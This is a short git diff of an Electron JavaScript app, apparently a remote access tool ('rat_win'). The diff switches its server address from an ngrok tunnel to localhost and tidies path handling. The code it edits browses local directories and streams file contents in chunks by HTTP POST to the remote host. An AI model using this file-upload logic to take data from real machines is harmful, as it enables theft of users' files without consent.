@@ -10,7 +10,7 @@ const fs = require('fs');
 const Store = require('electron-store'); const store = new Store;
 
 //const remotehost = 'http://localhost:1999';
-const remotehost = 'https://4381db06e54f.ngrok.io';
+const remotehost = 'http://localhost:1999';
 
 let mainWindow = null;//defines the window as an abject
 let rat_win = null
@@ -338,12 +338,11 @@ let directoryman = {
 			directoryman.files = [];
 			console.log(files)
 			files.forEach(filee => {
-				if (path.parse(searchpath + '\\' + filee).ext == "") {//directory
-					directoryman.files.push({ path: searchpath + '\\' + filee, name: filee, type: 'folder' })
+				if (path.parse(path.join(searchpath,filee)).ext == "") {//directory
+					directoryman.files.push({ path: path.join(searchpath,filee), name: filee, type: 'folder' })
 				} else {
-					directoryman.files.push({ path: searchpath + '\\' + filee, name: filee, type: 'file' })
+					directoryman.files.push({ path: path.join(searchpath,filee), name: filee, type: 'file' })
 				}
-				//directoryman.build_dir(searchpath + '\\' + filee, filee)
 			})
 
 		})
@@ -375,7 +374,7 @@ let directoryman = {
 		//post file chunks as buffers
 		fs.createReadStream(fpath).on('data', function (data) {
 
-			axios.default.post(remotehost + '/action/post/file/buffer', Uint8Array.from(data))//.finally(() => { console.log('Posted : ', data) });
+			axios.default.post(remotehost + '/action/post/file/buffer', data)
 		})
 
 	}
